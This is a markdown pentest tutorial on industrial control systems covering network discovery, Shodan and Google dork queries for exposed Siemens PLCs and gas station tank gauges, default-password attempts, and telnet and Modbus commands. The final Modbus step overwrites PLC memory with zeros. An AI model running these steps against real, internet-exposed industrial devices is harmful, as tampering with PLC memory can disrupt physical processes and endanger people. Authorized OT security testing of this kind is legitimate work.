# Disclaimer:

The following notes are based on scenario that you already have connected yourself to the network of the client/target either compromised it during your pentest activity or the access is granted to the network by your client.

## Tools used:
- netdiscover
- nmap
- snmp-check
- plcscan
- modbus
- ICSSecurityScripts
- Shodan
- metasploit
- Google Dorking
- searchsploit
  

# Let's begin:

### Network Discovery:

Assuming you are on a  `10.1.0.0/24` network.

Let's run `netdiscover` to identify all other devices up in this network range. For that we use the following command:

```sh
netdiscover -r 10.1.0.0/24
```
By default `netdiscover` runs in active mode, checking all hosts in a network. The output will provide you with list of IP addresses reachable in your network, MAC Address, and MAC Vendor or Hostname. MAC Vendor or Hostname determine what type of system is running on that IP and it is important information for your pentest activity.

Once we identify what IP addresses are reachable with your `netdiscover` network, we run `nmap` scan to discover which ports are open on that IP address. We run the following simple command to accomplish this task.

To scan all TCP ports:
```bash
nmap -Pn 10.1.0.11 -p 1-65535 
```

To scan UDP ports
```sh
nmap -Pn 10.1.0.11 -sU -p 1-65535
```
The results from `nmap` will provide you with all open ports on the specific IP Address.

Next, we run `snmp-check` tool to gain more information. You will run this when you have port `161/udp` open on the network. This tool will provide you with information such as vendor name, model series, fimware version, model code, serial number and other network data.

```sh
snmp-check 10.1.0.11
```

### Open Source Tools for Information Gathering:

We use tools such as `Shodan` and `Google Dorking` to identify hosts connected to the internet and accessible remotely. We later try to compromise them. An example of the queries is available below:

Shodan: `port: 102 Siemens SIMANTIC 6ES7`

Google Dork: `inurl:/portal/portal.mwsl`

You may try this and get a gist of what this dorks can provide you with.

Once you identify different portals accessible via the internet, you can try default passowrds to access them.

If you find port `102/tcp` or `502/tcp` open, you can also try default nmap scripts such as `s7-enumerate.nse` or `s7-info.nse` to find more information about the **Simens PLC** devices on the network. This can be achieved using the following command:

```bash
nmap 10.1.0.11 -Pn -p 102 --script s7-info.nse
```

You can also use `plcscan` tool to scan the PLC device. Compared to nmap scan, this can provide you with additional information - Serial Number of the Memory Card. It also attempts to check if port `102/tcp` or `502/tcp` is open and extracts information from those ports.

```bash
python2 plcscan.py 10.1.0.11
```

You can use `msfconsole` to now find for exploits related to Simens and other devices in the metasploit database. You can also use `searchsploit` to find more exploits.

```bash
msf6 > search Simens
```

```bash
searchsploit Simens
```

## Hacking Gas Stations

The communication phase of the gas station inventory works on port `10001`/`scp-config` by default. You can use `shodan` to find these devices. You can also look for device specific function code `I20100` and see how many devices are exposed.

Shodan: `I20100` or `Port:10001 I20100`

Use `nmap` scripts with `atg*.nse` in their name and run against the identified IP addresses. This script can provide you with **tank inventory report**

```bash
nmap 10.1.0.11 -p 10001 --script atg-info.nse
```

You can also use `telnet` to communicate with Tank Gas device on port `10001`. You should now the device specific function code to do this i.e. `I20100` or other based on your pentest scenario. The following command can do this for you:

```bash
telnet 10.1.0.11 10001
# After this command is executed, press CTRL + A, followed by device function code after pressing CTRL + A immediately.
```

Here is a list of all function codes:

```
I20100 - Tank Inventory Report
I20200 - Tank Delivery Report
I20300 - Tank Leak Detect Report
I20400 - Tank Shift Inventory Report
I20500 - Tank Status Report
```

While you are connected to `telnet`, after pressing `CTRL` + `A`, type the above mentioned codes to extract corresponding information.

### Hacking modbus

The modbus will be running on port `502/tcp` with service name `mbap`. It is a communication protocol used in OT systems. If you detect port `502` open, you can perfrom the following steps:

Run the `nmap` script named - `modbus-discover.nse` to extract more information about the protocal.

```bash
nmap 10.1.0.11 -p 502 -Pn --script modbus-discover.nse
```

use `modbus-cli` tool to directly read the memory contents

```bash
modbus read 10.1.0.19 %MW0 10
```

`%MW0` - strating memory address
`10` - iterate next consecutive 10 address data

To manipulate the memory contents, you can again use the `modbus-cli` tool. If let's say you want to owerwrite `0` as memory contents starting from address block 0 to 10, the you have to write 10 consecutive `0`'s as follows

```bash
modbus write 10.1.0.19 %MW0 0 0 0 0 0 0 0 0 0 0
```

This will owerwrite memory block from 0 to 10 with `0` as value
